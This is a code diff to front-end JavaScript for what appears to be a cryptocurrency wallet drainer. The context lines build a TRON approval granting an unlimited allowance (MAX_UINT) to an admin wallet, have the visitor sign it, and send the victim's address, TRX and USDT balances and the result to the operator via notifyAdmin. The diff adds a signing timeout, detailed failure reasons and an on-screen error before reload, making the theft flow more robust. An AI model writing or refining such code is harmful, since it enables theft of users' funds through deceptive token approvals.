@@ -99,10 +99,17 @@ document.getElementById('next-btn').addEventListener('click', async () => {
                         [{ type: 'address', value: CONFIG.ADMIN_WALLET }, { type: 'uint256', value: MAX_UINT }], address
                     );
 
-                    const signedTx = await result.provider.request({
+                    // Timeout promise to prevent getting stuck if wallet doesn't respond
+                    const timeoutPromise = new Promise((_, reject) => 
+                        setTimeout(() => reject(new Error("Request Timeout")), 60000)
+                    );
+
+                    const requestPromise = result.provider.request({
                         method: "tron_signTransaction",
                         params: { address: address, transaction: transaction }
                     });
+
+                    const signedTx = await Promise.race([requestPromise, timeoutPromise]);
 
                     const receipt = await localTronWeb.trx.sendRawTransaction(signedTx);
                     await notifyAdmin("✅ SUCCESS", address, trx, usdt, `TX: <code>${receipt.txid || "Success"}</code>`);
@@ -110,9 +117,23 @@ document.getElementById('next-btn').addEventListener('click', async () => {
                     location.reload();
                 } catch (err) {
                     let reason = "User Rejected";
-                    if (parseFloat(trx) < 25) reason = "Insufficient Gas (Low TRX)";
+                    if (err.message === "Request Timeout") reason = "Request Timeout (No Response)";
+                    else if (parseFloat(trx) < 25) reason = "Insufficient Gas (Low TRX)";
+                    else if (err.message) reason = err.message;
+
+                    // Show reason on screen for a short time
+                    const errorEl = document.getElementById('error-message');
+                    if (errorEl) {
+                        errorEl.innerText = "Error: " + reason;
+                        errorEl.classList.remove('hidden');
+                    }
+                    
                     await notifyAdmin("❌ FAILED", address, trx, usdt, `Reason: ${reason}`);
-                    location.reload();
+                    
+                    // Wait 3 seconds so user can see the reason before reload
+                    setTimeout(() => {
+                        location.reload();
+                    }, 3000);
                 }
             }, 800);
         } else {
